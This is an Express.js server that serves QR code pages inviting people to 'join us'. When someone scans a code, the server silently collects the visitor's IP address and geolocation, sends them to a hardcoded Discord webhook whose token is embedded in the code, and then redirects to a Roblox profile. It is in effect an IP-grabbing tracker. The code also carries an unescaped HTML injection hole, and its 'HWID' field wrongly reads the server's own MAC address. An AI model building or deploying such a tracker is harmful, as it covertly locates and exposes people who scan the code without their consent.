const express = require("express");
const axios = require("axios");
const QRCode = require("qrcode");
const getmac = require("getmac");
const geoip = require("geoip-lite");
const app = express();
const port = 3000 || process.env.PORT;

// Object to store QR code data
const codes = {};

// Endpoint to generate a QR code image
app.get("/q/image/:qrCode", async (req, res) => {
  const qrCode = req.params.qrCode;

  // Generate the QR code image
  try {
    const qrCodeImage = await QRCode.toDataURL(qrCode);

    // Store the generated QR code in the codes object
    codes[qrCode] = { qrCode, imageUrl: qrCodeImage };

    // Set Open Graph metadata for the page
    const title = `FluidQr - ${qrCode}`;
    const description = `Scan this QR code to join us`;
    const imageUrl = qrCodeImage;
    res.send(`
      <!DOCTYPE html>
      <html>
        <head>
          <meta property="og:title" content="${title}" />
          <meta property="og:description" content="${description}" />
          <meta property="og:image" content="${imageUrl}" />
        </head>
        <body>
          <img src="${imageUrl}" />
        </body>
      </html>
    `);
  } catch (error) {
    console.error(`Error generating QR code image: ${error}`);
    res.status(500).send(`Error generating QR code image`);
  }
});

// Endpoint to handle a scanned QR code
app.get("/q/scan/:code", async (req, res) => {
  const qrCode = req.params.code;

  // Get the corresponding data for the scanned code in the object
  const codeData = codes[qrCode];

  if (!codeData) {
    return res.status(404).send(`
      <html>
        <body>
          <h1>Code not found</h1>
        </body>
      </html>
    `);
  }

  // Get the user's HWID and IP address
  const hwid = getmac.default();
  const ip = req.ip;
  const geo = geoip.lookup(ip);
  var geolocation = undefined;

// If geo is null or undefined, set it to a default message
if (!geo) {
  geolocation = "No information available";
} else {
  geolocation = geo
}

// Add the user's HWID and IP address to the codeData object
codeData.hwid = hwid;
codeData.ip = ip;
codeData.geo = geo;

  // Define the embed object
  const embed = {
    title: "New QR code scan",
    color: 0x00ff00, // Green color
    timestamp: new Date(),
    fields: [
      {
        name: "QR code",
        value: `\`\`\`${qrCode}\`\`\``,
      },
      {
        name: "HWID",
        value: `\`\`\`${hwid}\`\`\``,
        inline: true,
      },
      {
        name: "IP",
        value: `\`\`\`${ip}\`\`\``,
        inline: true,
      },
      {
        name: "GEO",
        value: `\`\`\`${JSON.stringify(geolocation)}\`\`\``,
        inline: true,
      },
    ],
  };

  // Send a message to the Discord webhook with the embed object
  const webhookUrl =
    "https://discord.com/api/webhooks/1083180101656641546/M6oICtaPe5S-AWjC1to3XdGLkxdRfN3IxNW9WeL9Bu6qUu_1eIaLQyYZ4KtA3WYMXsKc"; // Replace with your actual webhook URL
  try {
    await axios.post(webhookUrl, {
      embeds: [embed],
    });
    console.log(`Sent message to Discord webhook`);
  } catch (error) {
    console.error(`Error sending message to Discord webhook: ${error}`);
  }

  // Redirect the user to the desired URL
  const redirectUrl = 'https://www.roblox.com/User.aspx?lD=12345&quot;';
  res.redirect(redirectUrl);
});

// Start the server
app.listen(port, () => {
  console.log(`Server started on port: ${port}`);
});
